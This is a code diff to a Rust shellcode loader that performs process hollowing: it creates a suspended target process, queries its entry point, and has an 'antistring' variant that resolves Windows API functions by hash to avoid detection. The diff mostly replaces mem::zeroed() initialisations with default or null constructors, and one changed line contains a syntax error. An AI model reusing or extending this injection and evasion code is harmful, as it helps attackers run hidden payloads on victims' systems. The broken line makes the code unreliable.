@@ -23,22 +23,22 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOA.html
-    let startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
+    let startup_info = STARTUPINFOA::default();
 
     // Create empty ProcessInformation struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
-    let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };
+    let mut process_information = PROCESS_INFORMATION::default();
 
     // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
-    let lp_application_name: PCSTR = unsafe { mem::zeroed() };
-    let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
+    let lp_application_name = PCSTR::null();
+    let mut lp_command_line = PSTR::null();
     lp_command_line.0 = CString::new(target_process)
         .unwrap()
         .into_raw() as *mut u8;
-    let lp_current_directory: PCSTR = unsafe { mem::zeroed() };
+    let lp_current_directory = PCSTR::null();
     let creation_result = unsafe { CreateProcessA(
         lp_application_name,
         lp_command_line,
@@ -58,8 +58,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
     let process_handle = process_information.hProcess;
-    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
-    let info_class: PROCESSINFOCLASS = unsafe { mem::zeroed() };
+    let mut basic_information: = PROCESS_BASIC_INFORMATION::default();
+    let info_class = PROCESSINFOCLASS::default();
     if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, info_class, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
     }
@@ -110,19 +110,19 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
 #[cfg(feature = "antistring")]
 pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     // See line 44
-    let startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
+    let startup_info = STARTUPINFOA::default();
 
     // See line 49
-    let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };
+    let mut process_information = PROCESS_INFORMATION::default();
 
     // See line 54
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
-    let lp_application_name: PCSTR = unsafe { mem::zeroed() };
-    let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
+    let lp_application_name = PCSTR::null();
+    let mut lp_command_line = PSTR::null();
     lp_command_line.0 = CString::new(target_process)
         .unwrap()
         .into_raw() as *mut u8;
-    let lp_current_directory: PCSTR = unsafe { mem::zeroed() };
+    let lp_current_directory = PCSTR::null();
     unsafe {
         mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
         (function)(
@@ -142,8 +142,8 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     // See line 76
     let function = rco_utils::find_function_address("Ntdll", 0x9b0d5adddbf90f8a).unwrap();
     let process_handle = process_information.hProcess;
-    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
-    let info_class: PROCESSINFOCLASS = unsafe { mem::zeroed() };
+    let mut basic_information = PROCESS_BASIC_INFORMATION::default();
+    let info_class = PROCESSINFOCLASS::default();
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, PROCESSINFOCLASS, *mut c_void, u32, *mut u32)>
         (function)(process_handle, info_class, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut())
